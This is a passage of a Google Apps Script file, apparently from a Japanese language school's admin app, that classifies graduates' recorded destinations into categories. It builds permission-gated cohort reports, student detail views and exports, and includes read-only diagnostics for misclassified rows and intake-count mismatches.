// this report honest. 未分類 is what the assignment UI consumes.
function _destinationCategory_(raw, aliases, industry, sid, overrides) {
  // 0. A per-student correction beats everything. It is a decision about THIS
  //    student rather than about the text, so no amount of cleverness in the
  //    rules below should be able to argue with it.
  if (sid && overrides && overrides[String(sid).trim()]) return overrides[String(sid).trim()];

  const s = String(raw == null ? "" : raw);
  if (_normName_(s) === "") return "未入力";
  const key = _normName_(s);

  // ── Order matters, and every step below was put where it is by a specific
  //    failure. Read this before moving anything.

  // 1. EXACT alias — a pattern matching the WHOLE value. An unambiguous decision
  //    about one row, so it beats even an explicit keyword:
  //    「就職活動ビザ→Sample Dining Group」 means they moved FROM a job-hunting visa
  //    TO that company, and no keyword can see the arrow.
  //    Assignments from the 未分類 queue save the full raw value, so anything
  //    resolved there lands here and always takes effect.
  for (let i = 0; i < (aliases || []).length; i++) {
    if (aliases[i].key === key) return aliases[i].cat;
  }

  // 2. An outcome stated outright. Beats SUBSTRING aliases, so 「見本（就職）」 is
  //    就職 however 見本 is mapped — a brand name is a guess about an institution,
  //    the stated outcome is a fact about the student.
  for (let i = 0; i < DEST_RULES_EXPLICIT.length; i++) {
    if (DEST_RULES_EXPLICIT[i].re.test(s)) return DEST_RULES_EXPLICIT[i].cat;
  }

  // 3. SUBSTRING alias — a brand inside a longer value. One entry for "XYZ"
  //    covers five spellings, which is why the table is worth having.
  for (let i = 0; i < (aliases || []).length; i++) {
    if (key.indexOf(aliases[i].key) !== -1) return aliases[i].cat;
  }

  // 4. Guess from the kind of place named.
  for (let i = 0; i < DEST_RULES_INFERRED.length; i++) {
    if (DEST_RULES_INFERRED[i].re.test(s)) return DEST_RULES_INFERRED[i].cat;
  }

  // 5. ⚠️ 業種 IS A LAST RESORT, NOT AN OVERRIDE. It decides only a value naming
  //    neither a school nor a company — a bare 「サンプルインタラクティブ」 with an
  //    industry beside it.
  //
  //    It sat ABOVE step 4 and called every school-named destination 就職 if the
  //    row had anything in 業種, which moved 230 rows: 進学 483→713, 就職 533→303.
  //    The instruction behind it ("data in 業種 means 就職") was real; making it an
  //    unconditional rule rather than a tiebreaker was the error. Someone employed
  //    AT a school is still 就職 — via an alias, a decision about one institution,
  //    not an inference applied to every school in the sheet.
  if (_normName_(industry) !== "") return "就職";

  // 6. Nobody knows. ⚠️ NOT その他 — an unclassified value is different from one
  //    classified as "other", and merging them hides the queue.
  return "未分類";
}

// Counts and percentages per 修了期, plus the 未分類 queue.
//
// Not cached: Past_DB is ~1450 rows and one pass over it is cheap next to the
// ~1s round-trip floor. Caching it would mean a key that has to be invalidated
// whenever an alias changes — and a stale cache key already cost two rounds of
// debugging on the 前年 work this week.
function getDestinationReport(role, perms) {
  if (!_hasPerm_(role, perms, "view_students")) throw new Error("権限がありません");

  const data = _readTabs_(["Past_DB"])["Past_DB"] || [];
  if (data.length < 2) return { cohorts: [], categories: DEST_CATEGORIES, unclassified: [], total: 0 };

  const destIdx = _pastCol_(data[0], "決定進路");
  const cohortIdx = _pastCol_(data[0], "修了期");
  const gyoIdx = _pastCol_(data[0], "業種");
  if (destIdx === -1) return { cohorts: [], categories: DEST_CATEGORIES, unclassified: [], total: 0,
                               error: "卒業生データに「決定進路」の項目がありません。（STU-01）" };

  const aliases = _destAliases_();
  const overrides = _destOverrides_();
  const sidIdx = _pastCol_(data[0], "学籍番号");
  let byCohort = {}, unclassified = {}, total = 0;

  for (let i = 1; i < data.length; i++) {
    const raw = String(data[i][destIdx] == null ? "" : data[i][destIdx]);
    const cohort = cohortIdx === -1 ? "(不明)" : (String(data[i][cohortIdx] || "").trim() || "(不明)");
    const gyo = gyoIdx === -1 ? "" : String(data[i][gyoIdx] || "");
    const sid = sidIdx === -1 ? "" : String(data[i][sidIdx] || "").trim();
    const cat = _destinationCategory_(raw, aliases, gyo, sid, overrides);
    if (!byCohort[cohort]) byCohort[cohort] = {};
    byCohort[cohort][cat] = (byCohort[cohort][cat] || 0) + 1;
    total++;
    if (cat === "未分類") {
      const k = raw.replace(/[\r\n]+/g, " ").trim();
      unclassified[k] = (unclassified[k] || 0) + 1;
    }
  }

  // Newest cohort first. The labels are the source tab names with 修了 stripped
  // ("2025.4~2026.3"), so a plain reverse sort orders them correctly.
  const names = Object.keys(byCohort).sort().reverse();
  const cohorts = names.map(function (n) {
    const c = byCohort[n];
    // ⚠️ The denominator EXCLUDES 未入力 and 未分類. A percentage over rows whose
    // outcome nobody knows is not a statistic, it is an average of ignorance.
    let known = 0;
    DEST_CATEGORIES.forEach(function (k) { known += (c[k] || 0); });
    let counts = {}, pct = {};
    DEST_CATEGORIES.forEach(function (k) {
      counts[k] = c[k] || 0;
      pct[k] = known ? Math.round(1000 * counts[k] / known) / 10 : null;
    });
    return { cohort: n, counts: counts, pct: pct, known: known,
             unentered: c["未入力"] || 0, unclassified: c["未分類"] || 0,
             rows: known + (c["未入力"] || 0) + (c["未分類"] || 0) };
  });

  const un = Object.keys(unclassified)
    .map(function (k) { return { value: k, count: unclassified[k] }; })
    .sort(function (a, b) { return b.count - a.count; });

  return { cohorts: cohorts, categories: DEST_CATEGORIES, unclassified: un, total: total };
}

// The students behind one cell of the report.
//
// A separate call rather than shipping every row with the summary: 1448 rows of
// named student data would be ~150KB on a screen most people open to read four
// numbers, and the boot payload was cut from 408KB to 158KB precisely to stop
// that kind of thing. One click costs one round trip; opening the tab costs none.
function getDestinationDetail(role, perms, cohort, category) {
  if (!_hasPerm_(role, perms, "view_students")) throw new Error("権限がありません");
  const wantCohort = String(cohort == null ? "" : cohort).trim();
  const wantCat = String(category == null ? "" : category).trim();

  const data = _readTabs_(["Past_DB"])["Past_DB"] || [];
  if (data.length < 2) return { rows: [] };
  const h = data[0];
  const destIdx = _pastCol_(h, "決定進路");
  if (destIdx === -1) return { rows: [] };

  const cohortIdx = _pastCol_(h, "修了期");
  const natIdx = _pastCol_(h, "国籍");
  const kenIdx = _pastCol_(h, "都道府県");
  const gyoIdx = _pastCol_(h, "業種");
  const courseIdx = _pastCol_(h, "コース");
  // 名前英語 is the one staff recognise; ニックネーム is the fallback because some
  // older rows have only that.
  const nameIdx = _pastCol_(h, "名前英語");
  const nickIdx = _pastCol_(h, "ニックネーム");

  const at = function (row, i) { return i === -1 ? "" : String(row[i] == null ? "" : row[i]).trim(); };
  const aliases = _destAliases_();
  const overrides = _destOverrides_();
  let rows = [];

  for (let i = 1; i < data.length; i++) {
    const r = data[i];
    const co = cohortIdx === -1 ? "(不明)" : (at(r, cohortIdx) || "(不明)");
    if (wantCohort !== "" && co !== wantCohort) continue;
    const raw = at(r, destIdx);
    const sid = at(r, _pastCol_(h, "学籍番号"));
    const cat = _destinationCategory_(raw, aliases, at(r, gyoIdx), sid, overrides);
    if (wantCat !== "" && cat !== wantCat) continue;
    rows.push({
      sid: sid,
      cohort: co,                                // the 集計表 modal cross-tabs on this
      nationality: at(r, natIdx),
      name: at(r, nameIdx) || at(r, nickIdx),
      course: _recCourseKey_(at(r, courseIdx)),   // strips the 期 prefix, as elsewhere
      destination: raw,
      prefecture: at(r, kenIdx),
      industry: at(r, gyoIdx),
      category: cat
    });
  }

  // By destination so the same school or employer groups together — that is how
  // anyone reads this list, rather than by student.
  rows.sort(function (a, b) {
    if (a.destination === b.destination) return a.name.localeCompare(b.name, "ja");
    return a.destination.localeCompare(b.destination, "ja");
  });
  return { cohort: wantCohort, category: wantCat, rows: rows };
}

// One graduate's full Past_DB record, as label/value pairs.
//
// Built from the sheet's own header row rather than a hardcoded field list: the
// sync gained 都道府県, 業種 and 修了期 this week, and a hardcoded list would have
// silently omitted all three.
function getPastStudentDetail(role, perms, studentId) {
  if (!_hasPerm_(role, perms, "view_students")) throw new Error("権限がありません");
  const want = String(studentId == null ? "" : studentId).trim();
  if (want === "") throw new Error("学籍番号がありません。");

  const data = _readTabs_(["Past_DB"])["Past_DB"] || [];
  if (data.length < 2) return { fields: [] };
  const h = data[0];
  const idIdx = _pastCol_(h, "学籍番号");
  if (idIdx === -1) return { fields: [] };

  for (let i = 1; i < data.length; i++) {
    if (String(data[i][idIdx] || "").trim() !== want) continue;
    let fields = [];
    for (let c = 0; c < h.length; c++) {
      const label = String(h[c] || "").trim();
      if (label === "") continue;
      fields.push({ label: label, value: String(data[i][c] == null ? "" : data[i][c]).trim() });
    }
    return { fields: fields };
  }
  return { fields: [] };
}

// The whole graduate list for export: every Past_DB column, plus the computed
// 区分 as a final column.
//
// A deliberately large payload — ~1450 rows — but it is only ever built when
// someone presses 出力, which is exactly when that is the right trade. The
// screen itself still costs nothing to open.
function getGraduateExport(role, perms) {
  if (!_hasPerm_(role, perms, "export_students")) throw new Error("権限がありません");
  const data = _readTabs_(["Past_DB"])["Past_DB"] || [];
  if (data.length < 2) return { rows: [] };

  const h = data[0];
  const destIdx = _pastCol_(h, "決定進路");
  const gyoIdx = _pastCol_(h, "業種");
  const aliases = _destAliases_();
  const overrides = _destOverrides_();
  const sidIdx = _pastCol_(h, "学籍番号");

  let rows = [h.map(function (c) { return String(c || ""); }).concat(["区分"])];
  for (let i = 1; i < data.length; i++) {
    const raw = destIdx === -1 ? "" : String(data[i][destIdx] == null ? "" : data[i][destIdx]);
    const gyo = gyoIdx === -1 ? "" : String(data[i][gyoIdx] || "");
    const sid = sidIdx === -1 ? "" : String(data[i][sidIdx] || "").trim();
    rows.push(data[i].map(function (c) { return String(c == null ? "" : c); })
                     .concat([_destinationCategory_(raw, aliases, gyo, sid, overrides)]));
  }
  return { rows: rows };
}

// Correct ONE student's 区分, keyed by 学籍番号.
//
// Distinct from saveDestinationAlias on purpose: an alias teaches a rule about
// the TEXT and applies to every row carrying it, now and in future intakes. This
// corrects a single record and generalises to nothing. 「就職決まらなければ帰国」
// is the case that needs it — three students, the same words, three different
// outcomes, and no rule about the sentence can be right for all of them.
function saveDestinationOverride(role, perms, studentId, category, actorName, actorId) {
  if (!_isAdminLevel_(role)) throw new Error("権限がありません");
  const sid = String(studentId == null ? "" : studentId).trim();
  const c = String(category == null ? "" : category).trim();
  if (sid === "") throw new Error("学籍番号がありません。");
  if (DEST_CATEGORIES.indexOf(c) === -1) throw new Error("区分が不正です: " + c);

  const sh = _getDestOverrideSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let found = -1;
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0] || "").trim() === sid) { found = i + 1; break; }
  }
  if (found > 0) sh.getRange(found, 2, 1, 3).setValues([[c, actorName || "", new Date()]]);
  else sh.appendRow([sid, c, actorName || "", new Date()]);

  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
                     "進路区分を個別修正", sid, c); } catch (e) {}
  return { saved: true };
}

// Assign a raw value (or any substring of one) to a category.
//
// Admin-level rather than view-level: it changes every figure on the report, so
// it is not something a read-only account should be able to do.
function saveDestinationAlias(role, perms, pattern, category, actorName, actorId) {
  if (!_isAdminLevel_(role)) throw new Error("権限がありません");
  const p = String(pattern == null ? "" : pattern).trim();
  const c = String(category == null ? "" : category).trim();
  if (p === "") throw new Error("パターンが空です。");
  if (DEST_CATEGORIES.indexOf(c) === -1) throw new Error("区分が不正です: " + c);

  const sh = _getDestAliasSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const key = _normName_(p);
  let found = -1;
  for (let i = 1; i < data.length; i++) {
    if (_normName_(String(data[i][0] || "")) === key) { found = i + 1; break; }
  }
  if (found > 0) {
    sh.getRange(found, 2, 1, 3).setValues([[c, actorName || "", new Date()]]);
  } else {
    sh.appendRow([p, c, actorName || "", new Date()]);
  }
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
                     "進路区分を設定", p, c); } catch (e) {}
  return { saved: true };
}

// DIAGNOSTIC (read-only). A monitor for the one thing the classifier cannot
// resolve on its own: a value mentioning MORE THAN ONE outcome.
//
// The ten such values in production were reviewed and the rules reordered around
// them — 就職 above その他, 就職(?!活動) because 就職活動 is job hunting, and a
// stated condition routed to 未分類. What remains here should be values whose
// answer is already agreed. Anything NEW appearing in this list is a value the
// rules have never been asked about, and is worth a look before it quietly lands
// in whichever bucket the array order happens to pick.
function diagnoseDestinationConflicts() {
  _requireMaintenanceUnlock_("diagnoseDestinationConflicts");
  const data = _readTabs_(["Past_DB"])["Past_DB"] || [];
  if (data.length < 2) return "Past_DB is empty.";
  const destIdx = _pastCol_(data[0], "決定進路");
  const gyoIdx = _pastCol_(data[0], "業種");
  const sidIdx = _pastCol_(data[0], "学籍番号");
  if (destIdx === -1) return "no 決定進路 column — run the sync first.";

  const aliases = _destAliases_();
  const overrides = _destOverrides_();
  let conflicts = [], totals = {}, out = [];

  for (let i = 1; i < data.length; i++) {
    const raw = String(data[i][destIdx] == null ? "" : data[i][destIdx]);
    const gyo = gyoIdx === -1 ? "" : String(data[i][gyoIdx] || "");
    const sid = sidIdx === -1 ? "" : String(data[i][sidIdx] || "").trim();
    const cat = _destinationCategory_(raw, aliases, gyo, sid, overrides);
    totals[cat] = (totals[cat] || 0) + 1;

    let hits = [];
    for (let k = 0; k < DEST_RULES_EXPLICIT.length; k++) {
      if (DEST_RULES_EXPLICIT[k].re.test(raw)) hits.push(DEST_RULES_EXPLICIT[k].cat);
    }
    // A per-student correction settles the row outright, so it is no longer a
    // conflict worth reporting however many keywords the text contains.
    if (hits.length > 1 && !(sid && overrides[sid]) && conflicts.length < 60) {
      conflicts.push(hits.join(" + ") + "  → " + cat + "\t" +
                     raw.replace(/[\r\n]+/g, " ").trim() +
                     (gyo.trim() ? "\t[業種 " + gyo.trim() + "]" : ""));
    }
  }

  out.push("=== values matching more than one outcome keyword: " + conflicts.length + " ===");
  if (!conflicts.length) out.push("  (none outstanding)");
  else {
    out.push("  Confirm each is landing where it should. A row that is wrong can be");
    out.push("  fixed per student from the 進路 tab, or per value with 「同じ内容すべて」.");
    conflicts.forEach(function (l) { out.push("  " + l); });
  }

  out.push("=== current totals ===");
  DEST_CATEGORIES.concat(["未分類", "未入力"]).forEach(function (c) {
    out.push("  " + c + "\t" + (totals[c] || 0));
  });
  const tot = Object.keys(totals).reduce(function (n, c) { return n + totals[c]; }, 0);
  out.push("  TOTAL\t" + tot + "/" + (data.length - 1) +
           (tot === data.length - 1 ? "  ✅" : "  ⚠️ rows lost"));

  const msg = out.join("\n");
  try {
    let chunk = [], n = 0;
    out.forEach(function (l) {
      if (n + l.length > 3000) { console.log(chunk.join("\n")); chunk = []; n = 0; }
      chunk.push(l); n += l.length + 1;
    });
    if (chunk.length) console.log(chunk.join("\n"));
  } catch (e) {}
  return msg;
}


// DIAGNOSTIC (read-only). ONLY the values the rules cannot place, nothing else.
//
// diagnoseDestinations prints a lot, and its 未分類 list — the one thing needed to
// improve the rules — sits at the end and kept getting truncated out of the
// execution log. Separate function, small output, survives.
function diagnoseUnclassified() {
  _requireMaintenanceUnlock_("diagnoseUnclassified");
  const data = _readTabs_(["Past_DB"])["Past_DB"] || [];
  if (data.length < 2) return "Past_DB is empty.";
  const destIdx = _pastCol_(data[0], "決定進路");
  if (destIdx === -1) return "no 決定進路 column — run the sync first.";

  // Uses the SHIPPING classifier, not a copy — see _destinationCategory_.
  const aliases = _destAliases_();
  const draft = function (raw, gyo) { return _destinationCategory_(raw, aliases, gyo); };

  const gyoIdxU = _pastCol_(data[0], "業種");
  let un = {};
  for (let i = 1; i < data.length; i++) {
    const raw = String(data[i][destIdx] == null ? "" : data[i][destIdx]);
    const gyoU = gyoIdxU === -1 ? "" : String(data[i][gyoIdxU] || "");
    if (draft(raw, gyoU) !== "未分類") continue;
    const k = String(raw).replace(/[\r\n]+/g, " ").trim();
    un[k] = (un[k] || 0) + 1;
  }
  const ks = Object.keys(un).sort(function (a, b) { return un[b] - un[a]; });

  let out = ["未分類 " + ks.length + " distinct values:"];
  ks.forEach(function (k) { out.push(un[k] + "\t" + k); });

  // Chunked: one oversized log entry is what truncated this before.
  try {
    let chunk = [], n = 0;
    out.forEach(function (l) {
      if (n + l.length > 3000) { console.log(chunk.join("\n")); chunk = []; n = 0; }
      chunk.push(l); n += l.length + 1;
    });
    if (chunk.length) console.log(chunk.join("\n"));
  } catch (e) {}
  return out.join("\n");
}

function diagnoseDestinations() {
  _requireMaintenanceUnlock_("diagnoseDestinations");
  const data = _readTabs_(["Past_DB"])["Past_DB"] || [];
  if (data.length < 2) return "Past_DB is empty.";

  const destIdx = _pastCol_(data[0], "決定進路");
  if (destIdx === -1) return "Past_DB has no 決定進路 column — run the sync first.";

  // ⚠️ 643 distinct values over 1404 rows: mostly company names, each unique.
  // Listing them all overflowed the execution log, so this reports DECISIONS —
  // how far the rules get, and what is left — rather than dumping the data. The
  // long tail is the finding: a mapping tab alone would mean classifying 643
  // entries by hand, so the rules have to carry the bulk and the tab the residue.
  let vals = {}, blank = 0, filled = 0;
  for (let i = 1; i < data.length; i++) {
    const raw = String(data[i][destIdx] == null ? "" : data[i][destIdx]);
    if (_normName_(raw) === "") { blank++; continue; }
    filled++;
    vals[raw] = (vals[raw] || 0) + 1;
  }
  const keys = Object.keys(vals);

  // Uses the SHIPPING classifier, not a copy — see _destinationCategory_.
  const aliases = _destAliases_();
  const draft = function (raw, gyo) { return _destinationCategory_(raw, aliases, gyo); };

  // ⚠️ Iterates ROWS, not distinct values. Since a filled 業種 means 就職, the
  // same destination string classifies differently depending on the row it is
  // on — 「○○大学」 is 進学 with no 業種 and 就職 with one. A per-value tally would
  // silently pick whichever row it saw first.
  const gyoIdxT = _pastCol_(data[0], "業種");
  let rows = {}, unmatchedCount = {}, distinct = {};
  for (let i = 1; i < data.length; i++) {
    const raw = String(data[i][destIdx] == null ? "" : data[i][destIdx]);
    const gyo = gyoIdxT === -1 ? "" : String(data[i][gyoIdxT] || "");
    const c = draft(raw, gyo);
    rows[c] = (rows[c] || 0) + 1;
    if (c === "未分類") {
      const k = raw.replace(/[\r\n]+/g, " ").trim();
      unmatchedCount[k] = (unmatchedCount[k] || 0) + 1;
    }
  }
  let unmatched = Object.keys(unmatchedCount).map(function (k) { return [unmatchedCount[k], k]; });
  distinct["未分類"] = unmatched.length;

  let out = [];
  out.push("Past_DB " + (data.length - 1) + " rows | 決定進路 filled " + filled +
           " blank " + blank + " distinct " + keys.length);
  // Rows only. A "distinct values per bucket" figure stopped being meaningful
  // once 業種 entered the decision: the same string lands in different buckets on
  // different rows. 未分類 still reports its distinct count, because that one IS
  // the size of the manual queue.
  out.push("--- classifier output, rows ---");
  DEST_CATEGORIES.concat(["未入力"]).forEach(function (c) {
    out.push("  " + c + "\t" + (rows[c] || 0));
  });
  out.push("  未分類\t" + (rows["未分類"] || 0) + "\t(" + (distinct["未分類"] || 0) + " distinct values)");
  const tot = Object.keys(rows).reduce(function (n, c) { return n + rows[c]; }, 0);
  out.push("  TOTAL\t" + tot + "/" + (data.length - 1) +
           (tot === data.length - 1 ? "  ✅" : "  ⚠️ rows lost"));

  // The only list worth printing: what the rules cannot place. Everything else is
  // already summarised above.
  unmatched.sort(function (a, b) { return b[0] - a[0]; });
  const cover = filled === 0 ? 0 : Math.round(100 * (filled - (rows["未分類"] || 0)) / filled);
  out.push("--- 未分類: " + (rows["未分類"] || 0) + " rows across " +
           unmatched.length + " values | rules cover " + cover + "% of filled rows ---");
  unmatched.slice(0, 40).forEach(function (u) { out.push("  " + u[0] + "\t" + u[1]); });
  if (unmatched.length > 40) out.push("  … and " + (unmatched.length - 40) + " more values");

  const cohortIdx = _pastCol_(data[0], "修了期");
  out.push("--- 修了期 ---");
  if (cohortIdx === -1) out.push("  ⚠️ absent — sync not re-run");
  else {
    let co = {};
    for (let i = 1; i < data.length; i++) {
      const c = String(data[i][cohortIdx] || "(blank)");
      co[c] = (co[c] || 0) + 1;
    }
    Object.keys(co).sort().forEach(function (c) { out.push("  " + c + "\t" + co[c]); });
  }

  const gyoIdx = _pastCol_(data[0], "業種");
  out.push("--- 業種 (top 20) ---");
  if (gyoIdx === -1) out.push("  ⚠️ absent — sync not re-run");
  else {
    let gy = {}, gf = 0;
    for (let i = 1; i < data.length; i++) {
      const v = String(data[i][gyoIdx] || "").trim();
      if (v === "") continue;
      gf++; gy[v] = (gy[v] || 0) + 1;
    }
    out.push("  filled " + gf + " | distinct " + Object.keys(gy).length);
    Object.keys(gy).sort(function (a, b) { return gy[b] - gy[a]; }).slice(0, 20)
      .forEach(function (k) { out.push("  " + gy[k] + "\t" + k); });
  }

  // Logged in sections: the execution log truncates a single large entry, and
  // the 未分類 list is the part that must survive.
  const msg = out.join("\n");
  try {
    let chunk = [], n = 0;
    out.forEach(function (l) {
      if (n + l.length > 4000) { console.log(chunk.join("\n")); chunk = []; n = 0; }
      chunk.push(l); n += l.length + 1;
    });
    if (chunk.length) console.log(chunk.join("\n"));
  } catch (e) {}
  return msg;
}


// DIAGNOSTIC (read-only). The 前年 column in 定員・残枠 buckets students by the
// intake encoded in 学籍番号 — first 4 digits year, next 2 month — and takes the
// course name from the course column with everything before the first "_"
// stripped off. If the figures are wrong, it is one of:
//   - the discarded prefix is the real intake, and 学籍番号 disagrees with it;
//   - the parsed course key does not match the names in REC_COURSES_BY_MONTH,
//     so the front-end looks up a key that does not exist and shows 0.
// This prints both so the answer is visible rather than argued about. Changes
// nothing.
function diagnoseLastYearCounts() {
  _requireMaintenanceUnlock_("diagnoseLastYearCounts");
  const tabs = _readTabs_(["Central_DB", "Past_DB"]);
  let out = [];

  // ⚠️ THE SURVEY BELOW COVERS BOTH TABS, BUT ONLY Central_DB FEEDS 前年.
  // Past_DB is withdrawn/graduated students and a withdrawal frees the slot.
  // It is shown here purely to describe the data — it is how we established that
  // Past_DB carries no 期 prefixes at all. Every figure after this section is
  // Central_DB only.
  out.push("(survey of both tabs — only Central_DB feeds the 前年 figures)");

  ["Central_DB", "Past_DB"].forEach(function (name) {
    const data = tabs[name];
    if (!data || data.length < 2) { out.push(name + ": empty or missing"); return; }
    const headers = data[0];
    const idIdx = headers.indexOf("学籍番号");
    const courseIdx = headers.indexOf("コース") !== -1 ? headers.indexOf("コース") : headers.indexOf("課程");
    out.push("=== " + name + " — rows " + (data.length - 1) +
             ", 学籍番号 idx " + idIdx + ", course idx " + courseIdx + " ===");
    if (idIdx === -1 || courseIdx === -1) {
      out.push("  ⚠ a required header is missing, so this tab contributes NOTHING.");
      out.push("  headers: " + headers.join(" | "));
      return;
    }

    // What the prefix before "_" actually contains, and how often each shape
    // appears. If these are intakes, they are a better source than 学籍番号.
    let prefixes = {}, noUnderscore = 0, keys = {}, idIntakes = {}, disagree = [];
    for (let i = 1; i < data.length; i++) {
      const sid = String(data[i][idIdx] || "").trim();
      const raw = String(data[i][courseIdx] || "");
      if (raw === "") continue;
      const u = raw.indexOf("_");
      if (u === -1) noUnderscore++;
      else prefixes[raw.substring(0, u).trim()] = (prefixes[raw.substring(0, u).trim()] || 0) + 1;

      let co = raw.substring(u + 1).trim()
        .replace(/[（(]一般[）)]/g, "").replace(/\d+期/g, "").trim();
      co = _normalizeCourseKana_(co);
      if (co) keys[co] = (keys[co] || 0) + 1;

      if (sid.length >= 6) {
        const k = parseInt(sid.substring(0, 4), 10) + "-" + parseInt(sid.substring(4, 6), 10);
        idIntakes[k] = (idIntakes[k] || 0) + 1;
        if (u !== -1 && disagree.length < 8) disagree.push(sid.substring(0, 6) + "  ⟵ 学籍番号 |  course: " + raw);
      }
    }

    out.push("  course values with no '_': " + noUnderscore);
    out.push("  prefixes before '_' (top 12):");
    Object.keys(prefixes).sort(function (a, b) { return prefixes[b] - prefixes[a]; })
      .slice(0, 12).forEach(function (p) { out.push("     " + JSON.stringify(p) + " × " + prefixes[p]); });
    out.push("  parsed course keys (what the front-end must match):");
    Object.keys(keys).sort(function (a, b) { return keys[b] - keys[a]; })
      .slice(0, 15).forEach(function (k) { out.push("     " + JSON.stringify(k) + " × " + keys[k]); });
    out.push("  intakes from 学籍番号 (top 10):");
    Object.keys(idIntakes).sort(function (a, b) { return idIntakes[b] - idIntakes[a]; })
      .slice(0, 10).forEach(function (k) { out.push("     " + k + " × " + idIntakes[k]); });
    out.push("  sample rows (学籍番号 prefix vs raw course):");
    disagree.forEach(function (d) { out.push("     " + d); });
  });

  // What the summary table will actually look up, so a mismatch is obvious.
  out.push("=== course names the 定員・残枠 table asks for ===");
  out.push("  (from REC_COURSES_BY_MONTH in Index.html — via the same _recCourseKey_)");
  ["進学2年課程", "進学1年課程", "就職2年課程", "日本語・文化2年課程",
   "進学1年9か月課程", "進学1年6か月課程", "進学1年3か月課程"].forEach(function (c) {
    out.push("     " + JSON.stringify(_recCourseKey_(c)));
  });

  // Where each student's intake actually came from. `disagreed` is the whole
  // reason this changed: those are the students who moved course, whose 学籍番号
  // still names the intake they left.
  const live = _enrolmentByIntakeMonthUncached_();

  // ⚠️ THE FIRST THING TO CHECK. This function computes FRESH; the table reads
  // through _cached_ with a 30-minute TTL. When the bucketing rule changes and the
  // key is not renamed, the two silently disagree — the diagnostic looks right
  // and the table stays wrong, which is exactly what happened here and cost two
  // rounds of debugging a rule that was already correct.
  out.push("=== cache ===");
  try {
    // The same call the table makes, so this reads whatever the table would read.
    const seen = JSON.stringify((_cached_('enrolByIntakeMonth4', CACHE_TTL_LONG,
                                 _enrolmentByIntakeMonthUncached_) || {}).matched);
    const fresh = JSON.stringify(live.matched);
    out.push(seen === fresh
      ? "  ✅ 表と同じ結果（キャッシュは最新）"
      : "  ⚠️ キャッシュが古い。表はこの診断と違う数字を出しています。\n" +
        "     Code.js の _cached_('enrolByIntakeMonth4', …) のキーを改名するか、30分待ってください。");
  } catch (e) { out.push("  (check failed: " + e.message + ")"); }

  // The 期 -> intake table, derived from the data. If a 期 shows few votes
  // relative to its total, the mode is shaky and worth a look.
  out.push("=== 期 → 入学期, derived from 学籍番号 (mode) ===");
  const kis = Object.keys(live.kiMap || {}).sort(function (a, b) { return a - b; });
  if (!kis.length) out.push("  (none — no NN期 prefixes found)");
  kis.forEach(function (ki) {
    const m = live.kiMap[ki];
    out.push("     " + ki + "期  →  " + m.y + "年" + m.mo + "月   (" + m.votes + "/" + m.total +
             " agree" + (m.votes < m.total ? "; " + (m.total - m.votes) + " moved" : "") + ")");
  });

  // Row-level evidence for the case with known ground truth: 2025年10月
  // 進学1年6か月課程 = 18, of which three moved in and still carry a 202604 学籍番号.
  // A count alone cannot tell you WHICH row is misfiled; this can.
  out.push("=== 進学1年6か月課程 — every row (expected: 18, all in 2025-10) ===");
  const WANT = _recCourseKey_("進学1年6か月課程");
  const rowTabs = _readTabs_(["Central_DB"]);   // Central_DB only, as the bucketing is
  let shown = 0, inWanted = 0;
  ["Central_DB"].forEach(function (name) {
    const d = rowTabs[name];
    if (!d || d.length < 2) return;
    const ii = d[0].indexOf("学籍番号");
    const ci = d[0].indexOf("コース") !== -1 ? d[0].indexOf("コース") : d[0].indexOf("課程");
    if (ii === -1 || ci === -1) return;
    for (let i = 1; i < d.length; i++) {
      const raw = String(d[i][ci] || "");
      if (_recCourseKey_(raw) !== WANT) continue;
      const sid = String(d[i][ii] || "").trim();
      const p = _coursePrefix_(raw);
      const fc = _intakeFromCourseCell_(raw, live.kiMap);
      const sy = sid.length >= 6 ? parseInt(sid.substring(0, 4), 10) : NaN;
      const smo = sid.length >= 6 ? parseInt(sid.substring(4, 6), 10) : NaN;
      const sidKey = (!isNaN(sy) && !isNaN(smo)) ? (sy + "-" + smo) : "?";
      const bucket = fc ? (fc.y + "-" + fc.mo) : sidKey;
      if (bucket === "2025-10") inWanted++;
      shown++;
      out.push("     " + sid + "  " + raw +
               "   期=" + (p && p.ki !== undefined ? p.ki : "-") +
               "  → " + bucket + "   (学籍番号 says " + sidKey + ")" +
               (bucket !== sidKey ? "   ← moved" : ""));
    }
  });
  out.push("     ---- " + shown + " rows, " + inWanted + " in 2025-10 " +
           (inWanted === 18 ? "✅ matches the expected 18" : "⚠️ expected 18"));

  out.push("=== intake source ===");
  out.push("  from the course-column prefix: " + live.fromCourseCol);
  out.push("  fell back to 学籍番号:          " + live.fromStudentId);
  out.push("  BOTH parsed but DISAGREED:     " + live.disagreed +
           "   ← students who changed course; these move to a different year now");

  // The same scan under the old rule, so the difference per intake is explicit
  // rather than inferred.
  out.push("=== per-intake totals: old rule (学籍番号) vs new (course column) ===");
  let oldT = {};
  const tabs2 = _readTabs_(["Central_DB"]);
  ["Central_DB"].forEach(function (name) {
    const d = tabs2[name];
    if (!d || d.length < 2) return;
    const ii = d[0].indexOf("学籍番号");
    const ci = d[0].indexOf("コース") !== -1 ? d[0].indexOf("コース") : d[0].indexOf("課程");
    if (ii === -1 || ci === -1) return;
    for (let i = 1; i < d.length; i++) {
      const sid = String(d[i][ii] || "").trim();
      if (sid.length < 6) continue;
      const y = parseInt(sid.substring(0, 4), 10), mo = parseInt(sid.substring(4, 6), 10);
      if (isNaN(y) || isNaN(mo)) continue;
      if (!_recCourseKey_(String(d[i][ci] || ""))) continue;
      const k = y + "-" + mo;
      oldT[k] = (oldT[k] || 0) + 1;
    }
  });
  let allKeys = {};
  Object.keys(oldT).forEach(function (k) { allKeys[k] = true; });
  Object.keys(live.matched).forEach(function (k) { allKeys[k] = true; });
  Object.keys(allKeys).sort().reverse().slice(0, 16).forEach(function (k) {
    const o = oldT[k] || 0, n = live.matched[k] || 0;
    out.push("     " + k + "   old " + o + "  →  new " + n + (o !== n ? "   ★ changed" : ""));
  });

  const msg = out.join("\n");
  try { console.log(msg); } catch (e) {}
  return msg;
}

// Run this from the Apps Script editor after any change that adds an OAuth scope
// — a new advanced service, Drive, Gmail (CLAUDE.md rule 6). Opening the web app
// does not reliably re-prompt, but running a function that touches the new scope
// does. Accept the consent dialog once and the deployment picks the scope up.
//
// It also reports whether the batched Sheets read is actually working: until the
// scope is granted, _recruitBatchValues_ returns null and the 募集状況 load falls
